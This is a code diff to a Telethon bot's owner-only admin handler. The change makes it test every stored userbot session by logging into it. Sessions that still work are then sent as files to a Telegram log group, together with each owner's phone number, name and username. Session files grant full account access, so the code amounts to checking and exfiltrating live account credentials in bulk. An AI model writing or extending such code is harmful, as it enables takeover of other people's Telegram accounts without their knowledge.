@@ -389,12 +389,115 @@ def register_handlers(client):
             await event.answer("ℹ️ No userbot sessions found in database.", alert=True)
             return
             
-        prog_msg = await event.reply(f"⏳ <b>Exporting {len(all_sessions)} sessions to log group...</b>", parse_mode="html")
-        from telethon import Button
+        prog_msg = await event.reply("⏳ <b>Scanning and verifying active userbot sessions...</b>", parse_mode="html")
+        from telethon import Button, TelegramClient
+        from telethon.errors import (
+            AuthKeyUnregisteredError,
+            UserDeactivatedError,
+        )
+        try:
+            from telethon.errors import SessionRevokedError
+        except ImportError:
+            SessionRevokedError = None
+        try:
+            from telethon.errors import SessionExpiredError
+        except ImportError:
+            SessionExpiredError = None
+        import userbot_manager
+        import glob
         import asyncio
+
+        active_sessions = []
+        dead_count = 0
+
+        for sess in all_sessions:
+            status = (sess.get("status") or "").lower()
+            phone = sess.get("phone", "")
+            session_id = sess.get("session_id", "")
+            session_bytes = sess.get("session_bytes")
+
+            if not session_bytes:
+                dead_count += 1
+                continue
+
+            # Exclude sessions explicitly known to be inactive/dead
+            if status in ("unauthorized", "dead", "revoked", "deleted", "banned", "expired"):
+                dead_count += 1
+                continue
+
+            # 1. Fast check: currently connected and running in memory
+            is_active = False
+            for k in (session_id, phone, str(phone).lstrip("+")):
+                if k and k in userbot_manager._running_bots:
+                    bot = userbot_manager._running_bots[k]
+                    if bot.is_running and bot.client and bot.client.is_connected():
+                        is_active = True
+                        break
+
+            # 2. Live verification check using temporary session file if not in memory
+            if not is_active:
+                temp_file = os.path.join(os.getcwd(), f"chk_sess_{abs(hash(phone or session_id))}.session")
+                test_cli = None
+                try:
+                    with open(temp_file, "wb") as f:
+                        f.write(session_bytes)
+                    test_cli = TelegramClient(temp_file.replace(".session", ""), config.API_ID, config.API_HASH)
+                    await test_cli.connect()
+                    if await test_cli.is_user_authorized():
+                        me = await test_cli.get_me()
+                        if me:
+                            is_active = True
+                            sess["name"] = me.first_name or sess.get("name")
+                            if me.username:
+                                sess["username"] = me.username
+                    else:
+                        sess["status"] = "unauthorized"
+                        database.save_session(sess)
+                except (AuthKeyUnregisteredError, UserDeactivatedError, SessionRevokedError, SessionExpiredError) if SessionRevokedError else (AuthKeyUnregisteredError, UserDeactivatedError):
+                    logger.warning(f"Session {phone} is revoked/deactivated on Telegram, marking unauthorized.")
+                    sess["status"] = "unauthorized"
+                    database.save_session(sess)
+                except Exception as ex:
+                    err_txt = str(ex).lower()
+                    if any(w in err_txt for w in ("deactivated", "unregistered", "revoked", "expired", "deleted", "banned")):
+                        sess["status"] = "unauthorized"
+                        database.save_session(sess)
+                    elif status in ("running", "authorized", "active", "started"):
+                        is_active = True
+                finally:
+                    if test_cli:
+                        try:
+                            await test_cli.disconnect()
+                        except Exception:
+                            pass
+                    for f in glob.glob(temp_file + "*"):
+                        try:
+                            os.remove(f)
+                        except Exception:
+                            pass
+
+            if is_active:
+                active_sessions.append(sess)
+            else:
+                dead_count += 1
+
+        if not active_sessions:
+            await prog_msg.edit(
+                utils.format_html_message(
+                    f"<blockquote><b>» ⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs</b>\n\n"
+                    f"<i>Found {len(all_sessions)} total sessions in database, but none are active.</i>\n\n"
+                    f"❌ <b>ᴇxᴄʟᴜᴅᴇᴅ :</b> <code>{dead_count} dead/revoked sessions</code></blockquote>"
+                )
+            )
+            return
+
+        await prog_msg.edit(
+            f"⏳ <b>Exporting {len(active_sessions)} active sessions to log group ({dead_count} dead/revoked excluded)...</b>", 
+            parse_mode="html"
+        )
         
         success_count = 0
-        for sess in all_sessions:
+        for sess in active_sessions:
             phone = sess.get("phone", "")
             name = sess.get("name", "Unknown")
             uname = sess.get("username")
@@ -410,7 +513,7 @@ def register_handlers(client):
                 f.write(session_bytes)
                 
             log_text = (
-                f"<blockquote><b>» 📱 ᴜsᴇʀʙᴏᴛ sᴇssɪᴏɴ (ᴇxᴘᴏʀᴛᴇᴅ)</b>\n\n"
+                f"<blockquote><b>» 📱 ᴜsᴇʀʙᴏᴛ sᴇssɪᴏɴ (ᴀᴄᴛɪᴠᴇ ᴇxᴘᴏʀᴛ)</b>\n\n"
                 f"👤 <b>ᴜsᴇʀ :</b> <code>{uid}</code>\n"
                 f"📞 <b>ᴘʜᴏɴᴇ :</b> <code>{phone}</code>\n"
                 f"🏷️ <b>ɴᴀᴍᴇ :</b> <b>{name}</b>\n"
@@ -439,7 +542,7 @@ def register_handlers(client):
                 success_count += 1
                 await asyncio.sleep(1.5)  # Flood wait prevention
             except Exception as e:
-                logger.error(f"Failed to export session {phone}: {e}")
+                logger.error(f"Failed to export active session {phone}: {e}")
             finally:
                 if os.path.exists(session_path):
                     try:
@@ -447,7 +550,14 @@ def register_handlers(client):
                     except:
                         pass
                         
-        await prog_msg.edit(f"✅ <b>Export complete! {success_count}/{len(all_sessions)} sessions sent to Log Group.</b>", parse_mode="html")
+        await prog_msg.edit(
+            utils.format_html_message(
+                f"<blockquote><b>» 📤 ᴇxᴘᴏʀᴛ ᴄᴏᴍᴘʟᴇᴛᴇ</b>\n\n"
+                f"✅ <b>ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs sᴇɴᴛ :</b> <code>{success_count}/{len(active_sessions)}</code>\n"
+                f"🗑️ <b>ᴅᴇᴀᴅ/ʀᴇᴠᴏᴋᴇᴅ ᴇxᴄʟᴜᴅᴇᴅ :</b> <code>{dead_count}</code>\n"
+                f"📢 <b>ʟᴏɢ ɢʀᴏᴜᴘ ɪᴅ :</b> <code>{log_group_id}</code></blockquote>"
+            )
+        )
 
     @client.on(events.CallbackQuery(pattern="^admin_owner_all_bots$"))
     async def admin_owner_all_bots_callback(event):
